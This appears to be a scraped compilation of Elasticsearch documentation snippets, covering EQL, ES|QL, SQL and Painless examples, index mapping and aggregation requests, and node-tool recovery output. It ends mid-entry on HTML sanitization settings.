JSON data representing a series of process events with different users that will be used to demonstrate how EQL sequence queries process matches. Each event contains user name and process name information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_37\n\nLANGUAGE: js\nCODE:\n```\n{ \"index\" : { \"_id\": \"1\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n{ \"index\" : { \"_id\": \"2\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n{ \"index\" : { \"_id\": \"3\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"bash\" }, ...}\n{ \"index\" : { \"_id\": \"4\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"bash\" }, ...}\n{ \"index\" : { \"_id\": \"5\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"bash\" }, ...}\n{ \"index\" : { \"_id\": \"6\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"attrib\" }, ...}\n{ \"index\" : { \"_id\": \"7\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"attrib\" }, ...}\n{ \"index\" : { \"_id\": \"8\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"bash\" }, ...}\n{ \"index\" : { \"_id\": \"9\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"cat\" }, ...}\n{ \"index\" : { \"_id\": \"10\" } }\n{ \"user\": { \"name\": \"elkbee\" }, \"process\": { \"name\": \"cat\" }, ...}\n{ \"index\" : { \"_id\": \"11\" } }\n{ \"user\": { \"name\": \"root\" }, \"process\": { \"name\": \"cat\" }, ...}\n```\n\n----------------------------------------\n\nTITLE: Synthetic Source with Binary Fields in Elasticsearch\nDESCRIPTION: This example shows how to set up an index with synthetic _source enabled and a binary field. It demonstrates that synthetic source may sort binary values based on their byte representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/binary.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"binary\": { \"type\": \"binary\", \"doc_values\": true }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"binary\": [\"IAA=\", \"EAA=\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Subtraction with Different Numeric Types in Painless\nDESCRIPTION: This snippet demonstrates the subtraction operator in Painless by illustrating how to subtract different numeric types and handle type promotion between int and double. It captures error cases for non-numeric types and outlines the behavior according to JVM specifications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_22\n\nLANGUAGE: painless\nCODE:\n```\nint i = 29-4;     <1>\ndouble d = i-7.5; <2>\n```\n\n----------------------------------------\n\nTITLE: MV_MEDIAN_ABSOLUTE_DEVIATION Markdown Documentation\nDESCRIPTION: Markdown documentation structure for the MV_MEDIAN_ABSOLUTE_DEVIATION function, including syntax diagram reference and includes for parameters, description, types and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `MV_MEDIAN_ABSOLUTE_DEVIATION` [esql-mv_median_absolute_deviation]\n\n**Syntax**\n\n:::{image} ../../../images/functions/mv_median_absolute_deviation.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/mv_median_absolute_deviation.md\n:::\n\n:::{include} ../description/mv_median_absolute_deviation.md\n:::\n\n:::{include} ../types/mv_median_absolute_deviation.md\n:::\n\n:::{include} ../examples/mv_median_absolute_deviation.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Supported TIME Workaround with Scalar Function\nDESCRIPTION: Example of a supported workaround for using TIME in GROUP BY by wrapping it with a scalar function that returns another data type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT count(*) FROM test GROUP BY MINUTE((CAST(date_created AS TIME));\n```\n\n----------------------------------------\n\nTITLE: Configuring Bytes Processor in Elasticsearch\nDESCRIPTION: Example configuration for the bytes processor that converts human-readable byte values in the 'file.size' field to raw byte values. The processor converts values like '1kb' to 1024 bytes, supporting units from 'b' to 'pb' case-insensitively.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/bytes-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"bytes\": {\n    \"field\": \"file.size\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Until Keyword in EQL Sequence\nDESCRIPTION: Demonstrates how to use the 'until' keyword to specify an expiration event for a sequence. The expiration event terminates sequence matching if it occurs between matching events.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_16\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ event_category_1 where condition_1 ]\n  [ event_category_2 where condition_2 ]\n  ...\nuntil [ event_category_3 where condition_3 ]\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Pre-Decrement Operator in Painless\nDESCRIPTION: This snippet shows the usage of the pre-decrement operator '--' with various numeric types in Painless, illustrating its behavior with type promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nshort i = 0;\n--i;\nlong j = 1;\nlong k;\nk = --j;\n```\n\n----------------------------------------\n\nTITLE: Filtering Source Fields with Wildcard Pattern in Elasticsearch\nDESCRIPTION: Example of using the _source parameter with a wildcard pattern to return only a subset of source fields in the search response, in this case only the obj field and its properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"_source\": \"obj.*\",\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting with Date Formatting in Elasticsearch\nDESCRIPTION: Shows how to use the 'format' parameter to specify a date format for sort values of date fields in the search response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"sort\" : [\n    { \"post_date\" : {\"format\": \"strict_date_optional_time_nanos\"}}\n  ],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rounding Height Values with ESQL ROUND Function\nDESCRIPTION: This ESQL query selects employees data, keeps only the name and height columns, then creates a new column that converts height from meters to feet and rounds to one decimal place.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/round.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| EVAL height_ft = ROUND(height * 3.281, 1)\n```\n\n----------------------------------------\n\nTITLE: Using LOG Function in Elasticsearch SQL\nDESCRIPTION: Returns the natural logarithm (base e) of the input numeric expression. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nLOG(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Referencing Columns with Special Characters in ESQL\nDESCRIPTION: Shows how to reference columns with special characters in subsequent commands using backticks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_12\n\nLANGUAGE: esql\nCODE:\n```\nFROM (\n  FROM employees\n  STATS AVG(salary)\n  BY department\n)\nEVAL `AVG(salary)` > 50000;\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIME Function in Elasticsearch SQL\nDESCRIPTION: Example demonstrating the CURRENT_TIME() function with default precision to get the current time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIME() AS result;\n\n         result\n------------------------\n12:31:27.237Z\n```\n\n----------------------------------------\n\nTITLE: Right Shift with Different Integer Types in Painless\nDESCRIPTION: This snippet demonstrates the right shift operator in Painless, capturing how to right shift different integer types and the related type promotions and error checks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_26\n\nLANGUAGE: painless\nCODE:\n```\nint i = 32 >> 1;  <1>\nlong l = i >> 2L; <2>\n```\n\n----------------------------------------\n\nTITLE: Basic Terms Query in Elasticsearch\nDESCRIPTION: Demonstrates a basic terms query searching for specific user IDs with an optional boost parameter to adjust relevance scoring\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"terms\": {\n      \"user.id\": [ \"kimchy\", \"elkbee\" ],\n      \"boost\": 1.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining TimeDefinition Enum\nDESCRIPTION: Defines the TimeDefinition enum within ZoneOffsetTransitionRule for specifying time definition types. Includes standard constants and methods for enum operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneOffsetTransitionRule$TimeDefinition {\n  ZoneOffsetTransitionRule.TimeDefinition STANDARD\n  ZoneOffsetTransitionRule.TimeDefinition UTC\n  ZoneOffsetTransitionRule.TimeDefinition WALL\n  LocalDateTime createDateTime(LocalDateTime,ZoneOffset,ZoneOffset)\n  ZoneOffsetTransitionRule.TimeDefinition valueOf(String)\n  ZoneOffsetTransitionRule.TimeDefinition[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Unsafe Cluster Bootstrapping\nDESCRIPTION: Shows the process of unsafe cluster bootstrapping when majority of master-eligible nodes are lost. Includes examples of checking cluster state terms and choosing the best node for bootstrapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_8\n\nLANGUAGE: txt\nCODE:\n```\nnode_1$ ./bin/elasticsearch-node unsafe-bootstrap\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nCurrent node cluster state (term, version) pair is (4, 12)\n\nYou should only run this tool if you have permanently lost half or more\nof the master-eligible nodes in this cluster, and you cannot restore the\ncluster from a snapshot. This tool can cause arbitrary data loss and its\nuse should be your last resort. If you have multiple surviving master\neligible nodes, you should run this tool on the node with the highest\ncluster state (term, version) pair.\n\nDo you want to proceed?\n\nConfirm [y/N] n\n```\n\nLANGUAGE: txt\nCODE:\n```\nnode_2$ ./bin/elasticsearch-node unsafe-bootstrap\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nCurrent node cluster state (term, version) pair is (5, 3)\n\nYou should only run this tool if you have permanently lost half or more\nof the master-eligible nodes in this cluster, and you cannot restore the\ncluster from a snapshot. This tool can cause arbitrary data loss and its\nuse should be your last resort. If you have multiple surviving master\neligible nodes, you should run this tool on the node with the highest\ncluster state (term, version) pair.\n\nDo you want to proceed?\n\nConfirm [y/N] n\n```\n\nLANGUAGE: txt\nCODE:\n```\nnode_2$ ./bin/elasticsearch-node unsafe-bootstrap\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nCurrent node cluster state (term, version) pair is (5, 3)\n\nYou should only run this tool if you have permanently lost half or more\nof the master-eligible nodes in this cluster, and you cannot restore the\ncluster from a snapshot. This tool can cause arbitrary data loss and its\nuse should be your last resort. If you have multiple surviving master\neligible nodes, you should run this tool on the node with the highest\ncluster state (term, version) pair.\n\nDo you want to proceed?\n\nConfirm [y/N] y\nMaster node was successfully bootstrapped\n```\n\n----------------------------------------\n\nTITLE: HTTP Body Tracer Log Output Example\nDESCRIPTION: Shows the format of compressed and encoded HTTP body trace logs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_14\n\nLANGUAGE: text\nCODE:\n```\n[TRACE][o.e.h.HttpBodyTracer     ] [master] [276] response body [part 1]: H4sIAAAAAAAA/9...\n[TRACE][o.e.h.HttpBodyTracer     ] [master] [276] response body [part 2]: 2oJ93QyYLWWhcD...\n[TRACE][o.e.h.HttpBodyTracer     ] [master] [276] response body (gzip compressed, base64-encoded, and split into 2 parts on preceding log lines)\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Exporter in YAML\nDESCRIPTION: Basic configuration for an HTTP exporter in Elasticsearch monitoring. Specifies the exporter type and host.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters.my_remote:\n  type: http\n  host: [\"host:port\", ...]\n```\n\n----------------------------------------\n\nTITLE: Defining Parameter Documentation for ESQL String Function in LaTeX\nDESCRIPTION: LaTeX markup defining the parameter documentation for an ESQL function that takes a string parameter. The documentation specifies that the function accepts a string expression which can be null (returning null in that case) and can be either a single- or multi-valued column or an expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_lower.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`str`\n:   String expression. If `null`, the function returns `null`. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon Geometry using GeoJSON in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Polygon geometry specified in GeoJSON format. The polygon is defined by five points forming a closed shape, with the first and last points being identical.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"Polygon\",\n    \"coordinates\" : [\n      [ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0], [100.0, 0.0] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Spotless Java Check with Gradle\nDESCRIPTION: Gradle command to check if Java files conform to Elasticsearch's formatting standards using the Spotless plugin without actually changing any files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew spotlessJavaCheck\n```\n\n----------------------------------------\n\nTITLE: Hourly Error Rate Calculation\nDESCRIPTION: Calculates error rates per hour using DATE_TRUNC with conditional logic. Uses CASE expression to identify errors, truncates timestamps to hours, and computes average error rate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_trunc.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| EVAL error = CASE(message LIKE \"*error*\", 1, 0)\n| EVAL hour = DATE_TRUNC(1 hour, @timestamp)\n| STATS error_rate = AVG(error) by hour\n| SORT hour\n```\n\n----------------------------------------\n\nTITLE: Scripted Heuristic for Significant Terms in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use a custom Painless script to calculate scores for significant terms. The script uses subset and superset frequencies to determine term significance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n    \"script_heuristic\": {\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"params._subset_freq/(params._superset_freq - params._subset_freq + 1)\"\n      }\n    }\n```\n\n----------------------------------------\n\nTITLE: Enable Debug Logging for Grok Processor\nDESCRIPTION: Configuration to enable debug logging for the Grok processor in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/grok-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nPUT _cluster/settings\n{\n  \"persistent\": {\n    \"logger.org.elasticsearch.ingest.common.GrokProcessor\": \"debug\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median Absolute Deviation in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MEDIAN_ABSOLUTE_DEVIATION function in an ESQL query. It calculates both the median and median absolute deviation of the 'salary' field from the 'employees' index. The function is useful for describing data that may have outliers or may not be normally distributed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MEDIAN(salary), MEDIAN_ABSOLUTE_DEVIATION(salary)\n```\n\n----------------------------------------\n\nTITLE: EQL Query with 'Any' Event Category\nDESCRIPTION: Demonstrates how to use the 'any' keyword to match events of any category or documents without an event category field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_2\n\nLANGUAGE: eql\nCODE:\n```\nany where network.protocol == \"http\"\n```\n\n----------------------------------------\n\nTITLE: Avg Aggregation with Missing Value Handling in Elasticsearch\nDESCRIPTION: Shows how to specify a default value for documents missing the aggregated field using the 'missing' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_search?size=0\n{\n  \"aggs\": {\n    \"grade_avg\": {\n      \"avg\": {\n        \"field\": \"grade\",\n        \"missing\": 10     <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-centroid aggregation on geo_shape fields in Elasticsearch\nDESCRIPTION: This snippet illustrates how to perform a geo_centroid aggregation on geo_shape fields, including both point and polygon data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geocentroid-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /places\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n\nPOST /places/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"name\": \"NEMO Science Museum\", \"geometry\": \"POINT(4.912350 52.374081)\" }\n{\"index\":{\"_id\":2}}\n{\"name\": \"Sportpark De Weeren\", \"geometry\": { \"type\": \"Polygon\", \"coordinates\": [ [ [ 4.965305328369141, 52.39347642069457 ], [ 4.966979026794433, 52.391721758934835 ], [ 4.969425201416015, 52.39238958618537 ], [ 4.967944622039794, 52.39420969150824 ], [ 4.965305328369141, 52.39347642069457 ] ] ] } }\n\nPOST /places/_search?size=0\n{\n  \"aggs\": {\n    \"centroid\": {\n      \"geo_centroid\": {\n        \"field\": \"geometry\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using COUNT(ALL) Function in Elasticsearch SQL\nDESCRIPTION: The COUNT(ALL) function returns the total number of all non-null input values in a specified field. It's equivalent to COUNT(field_name) without the ALL keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCOUNT(ALL field_name) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(ALL last_name) AS count_all, COUNT(DISTINCT last_name) count_distinct FROM emp;\n\n   count_all   |  count_distinct\n---------------+------------------\n100            |96\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(ALL CASE WHEN languages IS NULL THEN -1 ELSE languages END) AS count_all, COUNT(DISTINCT CASE WHEN languages IS NULL THEN -1 ELSE languages END) count_distinct FROM emp;\n\n   count_all   |  count_distinct\n---------------+---------------\n100            |6\n```\n\n----------------------------------------\n\nTITLE: Hashing Messages with SHA256 Function in ESQL\nDESCRIPTION: This snippet demonstrates how to apply the SHA256 hashing function to message fields in ESQL. It first filters out messages with 'Connection error', applies the SHA256 function to the message field, and then selects only the message and its corresponding hash value for display.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sha256.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL sha256 = sha256(message)\n| KEEP message, sha256\n```\n\n----------------------------------------\n\nTITLE: Indexing a Point Geometry using GeoJSON in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Point geometry specified in GeoJSON format. The coordinates are provided as longitude (-77.03653) and latitude (38.897676).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"Point\",\n    \"coordinates\" : [-77.03653, 38.897676]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LOCATE Function in Elasticsearch SQL\nDESCRIPTION: Returns the starting position of the first occurrence of a pattern within a source string. Includes an optional start position parameter to begin the search from a specific character position.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nLOCATE(\n    pattern, <1>\n    source   <2>\n    [, start]<3>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LOCATE('a', 'Elasticsearch');\n\nLOCATE('a', 'Elasticsearch')\n----------------------------\n3\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LOCATE('a', 'Elasticsearch', 5);\n\nLOCATE('a', 'Elasticsearch', 5)\n-------------------------------\n10\n```\n\n----------------------------------------\n\nTITLE: Configuring Stemmer Override Token Filter with Inline Rules in Elasticsearch\nDESCRIPTION: This snippet illustrates how to configure a custom analyzer with a stemmer override token filter using inline rules. The custom stems are defined directly in the index settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-override-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"lowercase\", \"custom_stems\", \"porter_stem\" ]\n        }\n      },\n      \"filter\": {\n        \"custom_stems\": {\n          \"type\": \"stemmer_override\",\n          \"rules\": [\n            \"running, runs => run\",\n            \"stemmer => stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Filter Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use a filter aggregation to calculate the average price of all sales and the average price of T-shirt sales specifically.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filter-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"avg_price\": { \"avg\": { \"field\": \"price\" } },\n    \"t_shirts\": {\n      \"filter\": { \"term\": { \"type\": \"t-shirt\" } },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Basic Suggestion with Multiple Inputs and Weight\nDESCRIPTION: Example of indexing a suggestion with multiple input values and a weight attribute. The weight determines suggestion scoring priority, and multiple inputs allow matching on different terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPUT music/_doc/1?refresh\n{\n  \"suggest\" : {\n    \"input\": [ \"Nevermind\", \"Nirvana\" ],\n    \"weight\" : 34\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Docker GC Logging Configuration\nDESCRIPTION: Example of setting up GC logging for Elasticsearch running in a Docker container.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nMY_OPTS=\"-Xlog:disable -Xlog:all=warning:stderr:utctime,level,tags -Xlog:gc=debug:stderr:utctime\"\ndocker run -e ES_JAVA_OPTS=\"$MY_OPTS\" # etc\n```\n\n----------------------------------------\n\nTITLE: Configuring Look Ahead Time in Elasticsearch\nDESCRIPTION: Setting to define the interval for calculating the end_time of a TSDS write index. Accepts values between 1m and 2h.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nindex.look_ahead_time: 30m\n```\n\n----------------------------------------\n\nTITLE: Subtraction with the Def Type in Painless\nDESCRIPTION: This snippet illustrates how to perform subtraction with the def type in Painless, with implicit casting from integer to def when performing arithmetic operations. It includes error considerations and showcases type promotion rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_23\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5-4; <1>\ndef y = x-2; <2>\n```\n\n----------------------------------------\n\nTITLE: Addition Operator in Painless\nDESCRIPTION: Demonstrates the addition operator ('+') in Painless with different numeric types.  The promotion rules determine the resulting type. The example demonstrates addition between int and double types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_20\n\nLANGUAGE: painless\nCODE:\n```\nint i = 29+4;     <1>\ndouble d = i+7.0; <2>\n```\n\n----------------------------------------\n\nTITLE: Setting Cron Triggers with Last Day Expressions in Elasticsearch\nDESCRIPTION: Examples of cron expressions using the 'L' character to trigger operations on the last day of a month, last specific day of a month, or last weekday of a month.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n0 5 9 L * ?\n```\n\nLANGUAGE: txt\nCODE:\n```\n0 5 9 ? * 2L\n```\n\nLANGUAGE: txt\nCODE:\n```\n0 5 9 LW * ?\n```\n\n----------------------------------------\n\nTITLE: Grammar Definition for Painless Comments\nDESCRIPTION: The formal grammar definition for comment syntax in Painless. It defines single-line comments starting with '//' and continuing until a newline, and multi-line comments enclosed between '/*' and '*/'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-comments.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nSINGLE_LINE_COMMENT: '//' .*? [\\n\\r];\nMULTI_LINE_COMMENT: '/*' .*? '*/';\n```\n\n----------------------------------------\n\nTITLE: Setting Year in DateTime\nDESCRIPTION: Demonstrates how to set the year component of a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_13\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime updatedZdt = zdt.withYear(1976);\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Token Filter in Java\nDESCRIPTION: This Java class implements a custom token filter that only accepts 'hello' and 'world' tokens. It extends Lucene's FilteringTokenFilter class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npackage org.example;\n\nimport org.apache.lucene.analysis.FilteringTokenFilter;\nimport org.apache.lucene.analysis.TokenStream;\nimport org.apache.lucene.analysis.tokenattributes.CharTermAttribute;\n\nimport java.util.Arrays;\n\npublic class HelloWorldTokenFilter extends FilteringTokenFilter {\n    private final CharTermAttribute term = addAttribute(CharTermAttribute.class);\n\n    public HelloWorldTokenFilter(TokenStream input) {\n        super(input);\n    }\n\n    @Override\n    public boolean accept() {\n        if (term.length() != 5) return false;\n        return Arrays.equals(term.buffer(), 0, 4, \"hello\".toCharArray(), 0, 4)\n                || Arrays.equals(term.buffer(), 0, 4, \"world\".toCharArray(), 0, 4);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Links Elements Group in Elasticsearch YAML\nDESCRIPTION: Includes the anchor element with href attributes pointing to http, https, and mailto protocols in the sanitization 